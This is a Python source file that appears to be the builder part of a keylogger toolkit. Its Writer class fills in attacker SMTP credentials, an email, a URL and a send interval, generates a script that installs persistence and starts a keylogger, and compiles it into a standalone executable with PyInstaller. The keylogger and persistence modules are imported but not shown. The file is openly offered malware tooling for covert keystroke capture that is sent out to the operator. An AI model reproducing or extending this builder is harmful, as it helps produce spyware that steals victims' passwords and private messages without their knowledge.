import os
import platform

class Writer:

    def __init__(self, smtp_addr, interval, email, password, url, name):

        self.smtp_addr = smtp_addr
        self.interval = interval
        self.email = email
        self.password = password
        self.url = url
        self.interval = int(self.interval)
        self.interval = self.interval * 60
        self.name = name

    def write_keylogger(self):

        chaine = \
            f"""
from keylogger import Keylogger
from persistence import Persistence

keylog = Keylogger(
                interval={self.interval},
                smtp_addr="{self.smtp_addr}",
                email="{self.email}",
                password="{self.password}",
                url="{self.url}"
)

if __name__ == "__main__":

    Persistence(name="{self.name}")
    keylog.start()
"""

        with open(f"{self.name}.py", "w") as file:

            file.write(chaine)
            file.close()

    def compile_keylog(self):

        try:
            os.system(f"pyinstaller -F {self.name}.py")
        except:

            if platform.system() == "Windows":
                os.system("py -m pip install pyinstaller")
            elif platform.system() == "Linux":
                os.system("pip3 install pyinstaller")
            else:
                pass